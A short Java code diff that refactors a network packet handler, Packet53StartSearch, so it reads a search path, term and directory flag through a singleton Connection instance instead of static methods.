@@ -10,12 +10,12 @@ public class Packet53StartSearch extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		String start = Connection.readLine();
+		String start = Connection.instance.readLine();
 		if (!start.endsWith(File.separator)) {
 			start = start + File.separator;
 		}
-		String what = Connection.readLine();
-		boolean dir = Connection.readBoolean();
+		String what = Connection.instance.readLine();
+		boolean dir = Connection.instance.readBoolean();
 		new FileSearch(start, what, dir).start();
 	}
 
